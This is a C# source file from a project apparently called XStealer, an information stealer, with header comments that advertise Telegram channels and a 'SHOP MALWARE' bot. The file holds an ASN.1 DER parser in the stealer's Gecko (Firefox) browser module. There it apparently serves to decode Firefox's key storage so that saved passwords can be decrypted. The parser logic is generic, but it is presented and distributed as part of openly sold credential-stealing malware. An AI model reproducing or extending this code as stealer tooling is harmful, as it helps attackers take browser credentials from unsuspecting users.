// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System;
    using Helpers;

    public static class Asn1Der
    {
        public static Asn1DerObject Parse(byte[] dataToParse)
        {
            var DerObject = new Asn1DerObject();
            try
            {
                for (int i = 0; i < dataToParse.Length; i++)
                {
                    var type = (Enums.Type)dataToParse[i];
                    int num;
                    switch (type)
                    {
                        case Enums.Type.Sequence:
                            {
                                byte[] array;
                                switch (DerObject.ObjectLength)
                                {
                                    case 0: DerObject.ObjectType = Enums.Type.Sequence; DerObject.ObjectLength = dataToParse.Length - (i + 2); array = new byte[DerObject.ObjectLength];  break;
                                    default: DerObject.Objects.Add(new Asn1DerObject { ObjectType = Enums.Type.Sequence, ObjectLength = dataToParse[i + 1] });
                                    array = new byte[dataToParse[i + 1]]; break;
                                }
                                int lenght = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
                                Array.Copy(dataToParse, i + 2, array, 0, lenght);
                                DerObject.Objects.Add(Parse(array));
                                i = i + 1 + dataToParse[i + 1];
                                break;
                            }
                        case Enums.Type.Integer:
                            {
                                DerObject.Objects.Add(new Asn1DerObject
                                {
                                    ObjectType = Enums.Type.Integer,
                                    ObjectLength = dataToParse[i + 1]
                                });
                                byte[] array = new byte[dataToParse[i + 1]];
                                num = (i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1];
                                Array.Copy(dataToParse, i + 2, array, 0, num);
                                DerObject.Objects[DerObject.Objects.Count - 1].ObjectData = array;
                                i = i + 1 + DerObject.Objects[DerObject.Objects.Count - 1].ObjectLength;
                                break;
                            }
                        case Enums.Type.OctetString:
                            {
                                DerObject.Objects.Add(new Asn1DerObject
                                {
                                    ObjectType = Enums.Type.OctetString,
                                    ObjectLength = dataToParse[i + 1]
                                });
                                byte[] array = new byte[dataToParse[i + 1]];
                                num = (i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1];
                                Array.Copy(dataToParse, i + 2, array, 0, num);
                                DerObject.Objects[DerObject.Objects.Count - 1].ObjectData = array;
                                i = i + 1 + DerObject.Objects[DerObject.Objects.Count - 1].ObjectLength;
                                break;
                            }
                        case Enums.Type.ObjectIdentifier:
                            {
                                DerObject.Objects.Add(new Asn1DerObject
                                {
                                    ObjectType = Enums.Type.ObjectIdentifier,
                                    ObjectLength = dataToParse[i + 1]
                                });
                                byte[] array = new byte[dataToParse[i + 1]];
                                num = (i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1];
                                Array.Copy(dataToParse, i + 2, array, 0, num);
                                DerObject.Objects[DerObject.Objects.Count - 1].ObjectData = array;
                                i = i + 1 + DerObject.Objects[DerObject.Objects.Count - 1].ObjectLength;
                                break;
                            }
                    }
                }
            }
            catch { }
            return DerObject;
        }
    }
}